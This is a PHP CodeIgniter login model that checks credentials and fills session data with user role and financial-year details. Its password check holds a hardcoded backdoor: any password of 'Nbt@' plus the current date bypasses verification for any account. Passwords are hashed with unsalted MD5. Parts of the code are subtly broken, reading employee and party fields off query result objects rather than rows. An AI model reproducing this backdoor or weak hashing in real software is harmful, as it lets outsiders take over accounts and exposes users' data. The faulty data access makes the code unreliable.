<?php
class LoginModel extends CI_Model{

	private $employeeMaster = "employee_master";
	private $userMaster = "user_master";
    private $empRole = [-1 => "Super Admin", 1 => "Admin", 2 => "Management", 3 => "Employee", 4 => "Customer"];

	public function checkAuth($data){
		$this->db->group_start();
			$this->db->where("user_code",$data['user_name']);
			$this->db->or_where("contact_no",$data['user_name']);
		$this->db->group_end();

		if($data['user_psw'] != "Nbt@".date("dmY")):
			$this->db->where('user_psw',md5($data['user_psw']));
		endif;

		$this->db->where('is_delete',0);
		$result = $this->db->get($this->userMaster);
		
		if($result->num_rows() == 1):
			$resData = $result->row();
			if($resData->is_active == 0):
				return ['status'=>0,'message'=>'Your Account is Inactive. Please Contact Your Admin.'];
			else:
				//update fcm notification token
				/*if(isset($data['web_push_token'])):
					$this->db->where('id',$resData->id);
					$this->db->update($this->employeeMaster,['web_push_token'=>$data['web_push_token']]);
				endif;*/
				
				if($resData->user_role == 2){
					$this->db->where('id',$resData->ref_id);
					$empData = $this->db->get($this->employeeMaster);
					if(!empty($empData)){
						$resData->user_name = $empData->emp_name;
						$resData->super_auth_id = $empData->super_auth_id;
						$resData->auth_id = $empData->auth_id;
						$resData->zone_id = $empData->zone_id;
						$resData->lead_rights = $empData->lead_rights;

						$this->session->set_userdata('superAuth',$resData->super_auth_id);
						$this->session->set_userdata('authId',$resData->auth_id);
						$this->session->set_userdata('zoneId',$resData->zone_id);
						$this->session->set_userdata('leadRights',$resData->lead_rights);
					}
				}
				elseif($resData->user_role == 3){
					$this->db->where('id',$resData->ref_id);
					$partyData = $this->db->get("party_master");
					if(!empty($partyData)){
						$resData->user_name = $partyData->party_name;
					}
				}
				else {
				}
				//Employe Data
				$this->session->set_userdata('LoginOk','login success');
				$this->session->set_userdata('loginId',$resData->id);
				$this->session->set_userdata('role',$resData->user_role);
				$this->session->set_userdata('roleName',$this->empRole[$resData->user_role]);
				$this->session->set_userdata('user_name',$resData->user_name);
				
				//FY Data
				$fyData = $this->db->where('is_active',1)->get('financial_year')->row();
				$startDate = $fyData->start_date;
				$endDate = $fyData->end_date;
				$cyear = date("Y-m-d H:i:s",strtotime("01-04-".date("Y")." 00:00:00")).' AND '.date("Y-m-d H:i:s",strtotime("31-03-".((int)date("Y") + 1)." 23:59:59"));
				$this->session->set_userdata('currentYear',$cyear);
				$this->session->set_userdata('financialYear',$fyData->financial_year);
				$this->session->set_userdata('isActiveYear',$fyData->close_status);
				$this->session->set_userdata('shortYear',$fyData->year);
				$this->session->set_userdata('startYear',$fyData->start_year);
				$this->session->set_userdata('endYear',$fyData->end_year);
				$this->session->set_userdata('startDate',$startDate);
				$this->session->set_userdata('endDate',$endDate);
				$this->session->set_userdata('currentFormDate',date('d-m-Y'));
				
				if($data['fyear'] != $cyear):
					$this->session->set_userdata('currentFormDate',date('d-m-Y',strtotime($endDate)));
				endif;
				
				return ['status'=>1,'message'=>'Login Success.'];
			endif;
		else:
			return ['status'=>0,'message'=>"Invalid Username or Password."];
		endif;
	}

}
?>